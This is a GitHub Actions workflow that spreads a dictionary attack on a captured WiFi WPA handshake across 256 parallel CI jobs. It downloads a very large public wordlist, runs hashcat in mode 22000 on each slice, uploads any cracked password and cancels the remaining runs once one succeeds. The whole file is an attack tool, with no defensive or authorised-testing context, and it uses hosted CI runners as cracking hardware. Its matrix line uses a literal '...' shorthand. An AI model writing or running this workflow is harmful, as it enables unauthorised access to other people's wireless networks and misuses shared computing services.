name: full-dict-256

on:
  workflow_dispatch:

jobs:
  crack:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 20
      matrix:
        job_id: [0,1,2,...,255]

    steps:
      - name: Install tools
        run: |
          sudo apt-get update
          sudo apt-get install -y p7zip-full hashcat

      - name: Download dictionary
        run: |
          wget -O all_in_one.txt.7z https://download.weakpass.com/wordlists/2088/all_in_one.txt.7z

      - name: Extract this job's 120M lines
        run: |
          TOTAL_LINES=29630000000
          JOBS=256
          LINES_PER_JOB=$(( (TOTAL_LINES + JOBS - 1) / JOBS ))

          START=$(( ${{ matrix.job_id }} * LINES_PER_JOB + 1 ))
          END=$(( (${{ matrix.job_id }} + 1) * LINES_PER_JOB ))

          echo "Job ${{ matrix.job_id }} processing lines $START to $END"

          7z x all_in_one.txt.7z -so | \
            awk -v s=$START -v e=$END 'NR>=s && NR<=e' > dict.txt

      - name: Run hashcat
        run: |
          hashcat -m 22000 -a 0 -w 3 hs/wifi-01.hc22000 dict.txt \
            -o result.txt --logfile=hashcat.log

      - name: Check cracked
        id: check
        run: |
          if grep -q ":Cracked" hashcat.log; then
            echo "found=true" >> $GITHUB_OUTPUT
          else
            echo "found=false" >> $GITHUB_OUTPUT
          fi

      - name: Upload result
        if: steps.check.outputs.found == 'true'
        uses: actions/upload-artifact@v4
        with:
          name: cracked_result
          path: |
            result.txt
            hashcat.log

      - name: Stop all jobs
        if: steps.check.outputs.found == 'true'
        run: |
          echo "Password found. Stopping all jobs."
          gh run cancel --repo $GITHUB_REPOSITORY $(gh run list --limit 100 --json databaseId -q '.[].databaseId')

      - name: Delete slice
        if: steps.check.outputs.found == 'false'
        run: |
          rm -f dict.txt
